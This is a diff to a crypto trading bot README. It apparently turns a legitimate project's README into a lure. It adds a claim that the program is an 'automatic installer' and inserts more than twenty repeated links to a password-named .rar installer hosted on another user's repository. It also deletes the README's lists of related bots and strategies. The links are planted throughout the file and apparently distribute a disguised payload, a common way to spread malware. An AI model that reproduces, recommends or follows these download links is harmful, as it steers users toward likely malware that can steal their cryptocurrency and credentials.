@@ -2,6 +2,13 @@
 
 ## Crypto Trading Bot is an automatic installer. All you need to do is run the program, and it will automatically install all the necessary components. 🤖🔧📈
 **[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
 
 [![Build Status](https://github.com/Haehnchen/crypto-trading-bot/actions/workflows/node.js.yml/badge.svg)](https://github.com/Haehnchen/crypto-trading-bot/actions/workflows/node.js.yml)
 
@@ -49,6 +56,9 @@ TODOS:
 - express
 - Bootstrap v4
 - Tradingview widgets
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
 
 ## How to use
 
@@ -140,6 +150,9 @@ Look for id: -1001118554477 is your chat id (with the negative sign).
 ### Log messages to Telegram
 
 For example setup, check `conf.json.dist file`, log.telegram section , set chatId, token, level (default is info). Check more options https://github.com/ivanmarban/winston-telegram#readme
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
 
 ## Webserver
 
@@ -387,6 +400,9 @@ Per pair you can set used margin before orders are created; depending on exchang
 ```
 
 ## Tools
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
 
 ### Fill data
 
@@ -409,28 +425,12 @@ npm test
 ```
 
 ## Related Links
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
 
 ### Trading Bots Inspiration
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
 
-Other bots with possible design pattern
-
-- https://github.com/DeviaVir/zenbot
-- https://github.com/magic8bot/magic8bot
-- https://github.com/askmike/gekko
-- https://github.com/freqtrade/freqtrade
-- https://github.com/Ekliptor/WolfBot
-- https://github.com/andresilvasantos/bitprophet
-- https://github.com/kavehs87/PHPTradingBot
-- https://github.com/Superalgos/Superalgos
-
-### Strategies
-
-Some strategies based on technical indicators for collection some ideas
-
-- https://github.com/freqtrade/freqtrade-strategies
-- https://github.com/freqtrade/freqtrade-strategies/tree/master/user_data/strategies/berlinguyinca
-- https://github.com/xFFFFF/Gekko-Strategies
-- https://github.com/sthewissen/Mynt/tree/master/src/Mynt.Core/Strategies
-- https://github.com/Ekliptor/WolfBot/tree/master/src/Strategies
-- https://github.com/Superalgos/Strategy-BTC-WeakHandsBuster
-- https://github.com/Superalgos/Strategy-BTC-BB-Top-Bounce
